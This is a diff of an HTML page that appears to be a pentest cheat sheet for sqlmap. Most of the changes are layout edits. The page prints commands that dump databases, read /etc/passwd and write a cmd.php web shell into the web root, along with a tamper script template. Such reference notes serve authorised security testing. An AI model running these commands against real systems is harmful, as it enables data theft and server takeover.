@@ -196,10 +196,13 @@
 
 <div class="content"><hr>
 <h3 id="sqlmap">sqlmap</h3>
-<p><a href="https://github.com/sqlmapproject/sqlmap">Download sqlmap</a></p>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># In Burp Suite, we can right click the request and click `copy to file` to save the request</span>
 </span></span><span class="line"><span class="cl"><span class="c1"># And add `*` to request to indicate the sql injection point</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Initial testing HTTP</span>
+</span></span></code></pre></div></div>
+<br>
+<div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Initial testing HTTP</span>
 </span></span><span class="line"><span class="cl">sqlmap -r request --batch --banner --proxy<span class="o">=</span>http://127.0.0.1:8080 --level <span class="m">3</span> --risk <span class="m">3</span> --threads<span class="o">=</span><span class="m">10</span>
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Initial testing HTTPS</span>
 </span></span><span class="line"><span class="cl">sqlmap -r request --batch --proxy<span class="o">=</span>http://127.0.0.1:8080 --level <span class="m">3</span> --risk <span class="m">3</span> --threads<span class="o">=</span><span class="m">10</span> --force-ssl
@@ -215,7 +218,9 @@
 </span></span><span class="line"><span class="cl">sqlmap -r request --batch --proxy<span class="o">=</span>http://127.0.0.1:8080 --level <span class="m">3</span> --risk <span class="m">3</span> --threads<span class="o">=</span><span class="m">10</span> -D &lt;DB_NAME&gt; --dump
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Specify technique</span>
 </span></span><span class="line"><span class="cl">sqlmap -r request --batch --proxy<span class="o">=</span>http://127.0.0.1:8080 --level <span class="m">3</span> --risk <span class="m">3</span> --threads<span class="o">=</span><span class="m">10</span> --technique U
-</span></span></code></pre></div><h4 id="technique">Technique</h4>
+</span></span></code></pre></div></div>
+<h4 id="technique">Technique</h4>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">+------------------------+
 </span></span><span class="line"><span class="cl">| B: Boolean-based blind |
 </span></span><span class="line"><span class="cl">| E: Error-based         |
@@ -224,7 +229,9 @@
 </span></span><span class="line"><span class="cl">| T: Time-based blind    |
 </span></span><span class="line"><span class="cl">| Q: Inline queries      |
 </span></span><span class="line"><span class="cl">+------------------------+
-</span></span></code></pre></div><h4 id="advance-sqlmap">Advance sqlmap</h4>
+</span></span></code></pre></div></div>
+<h4 id="advance-sqlmap">Advance sqlmap</h4>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># File write</span>
 </span></span><span class="line"><span class="cl">sqlmap -r request --batch --proxy<span class="o">=</span>http://127.0.0.1:8080 --level <span class="m">3</span> --risk <span class="m">3</span> --threads<span class="o">=</span><span class="m">10</span> --random-agent --file-write ./cmd.php --file-dest /var/www/html/cmd.php
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Add payload tamper script, e.g. randomcase</span>
@@ -235,7 +242,9 @@
 </span></span><span class="line"><span class="cl">sqlmap -r request --file-read<span class="o">=</span>/etc/passwd
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Write a file</span>
 </span></span><span class="line"><span class="cl">sqlmap -r request --file-write<span class="o">=</span>./test.txt --file-dest<span class="o">=</span>/tmp/test.txt
-</span></span></code></pre></div><h4 id="tamperpy-template">tamper.py template</h4>
+</span></span></code></pre></div></div>
+<h4 id="tamperpy-template">tamper.py template</h4>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">lib.core.enums</span> <span class="kn">import</span> <span class="n">PRIORITY</span>
@@ -246,8 +255,9 @@
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">tamper</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
 </span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">payload</span>
-</span></span></code></pre></div><p><small><em>Note: create an empty <code>__init__.py</code> in the same folder</em></small></p>
-</div></div>
+</span></span></code></pre></div></div>
+<p><small><em>Note: create an empty __init__.py in the same folder</em></small></p>
+<br></div></div>
     
     <script src="/js/utils.js"></script>
     <footer>
